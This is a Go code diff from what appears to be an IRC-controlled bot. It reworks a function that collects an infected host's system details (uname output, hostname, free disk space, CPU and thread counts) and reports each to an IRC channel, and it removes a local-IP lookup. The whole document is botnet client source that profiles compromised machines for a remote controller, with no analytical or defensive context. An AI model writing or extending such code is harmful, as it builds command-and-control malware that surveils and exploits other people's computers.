@@ -5,50 +5,49 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"runtime"
+	"strconv"
 
 	"golang.org/x/sys/unix"
 )
 
-type botinfo struct {
-	sys, hn, fds, lip string
+type botsysteminfo struct {
+	sys, hn, fds string
+	ncpu         int
 }
 
-func freeDiskSpace(hw string) uint64 {
+func freeDiskSpace(wd string) uint64 {
 	var stat unix.Statfs_t
-	unix.Statfs(hw, &stat)
+	unix.Statfs(wd, &stat)
 	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024
 }
 
-func getLocalIP() (string, error) {
-	conn, err := net.Dial("udp", "8.8.8.8:22")
+func sysInfo(reportIRC net.Conn, set_chan string) string {
+	cmd, err := exec.Command("uname", "-a").Output()
 	if err != nil {
-		return "", err
+		IRC_Report(reportIRC, set_chan, "Get system infomation is failed...")
 	}
-	defer conn.Close()
-
-	ip := conn.LocalAddr().String()
-	return ip, nil
+	return string(cmd)
 }
 
-func sysInfo() string {
-	cmd, _ := exec.Command("uname", "-a").Output()
-	return string(cmd)
+func (inf botsysteminfo) threadsNumber() string {
+	return strconv.Itoa(inf.ncpu * 2)
 }
 
 func ReportInf(reportIRC net.Conn, set_chan string) {
 	hName, _ := os.Hostname()
-	pDir, _ := os.Getwd()
+	wd, _ := os.Getwd()
 
-	hw := &pDir
-	nbotinfo := botinfo{
-		sys: sysInfo(),
-		hn:  hName,
-		fds: fmt.Sprint(freeDiskSpace(*hw)),
-		lip: fmt.Sprint(getLocalIP()),
+	_botsysteminfo := botsysteminfo{
+		sys:  sysInfo(reportIRC, set_chan),
+		hn:   hName,
+		fds:  fmt.Sprint(freeDiskSpace(wd)),
+		ncpu: runtime.NumCPU(),
 	}
 
-	IRC_Report(reportIRC, set_chan, "System Info: "+nbotinfo.sys)
-	IRC_Report(reportIRC, set_chan, "Host Name: "+nbotinfo.hn)
-	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+nbotinfo.fds)
-	IRC_Report(reportIRC, set_chan, "Local IP: "+nbotinfo.lip)
+	IRC_Report(reportIRC, set_chan, "System: "+_botsysteminfo.sys)
+	IRC_Report(reportIRC, set_chan, "Host Name: "+_botsysteminfo.hn)
+	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+_botsysteminfo.fds)
+	IRC_Report(reportIRC, set_chan, "Number of CPUs: "+strconv.Itoa(_botsysteminfo.ncpu))
+	IRC_Report(reportIRC, set_chan, "Number of Threads: "+_botsysteminfo.threadsNumber())
 }
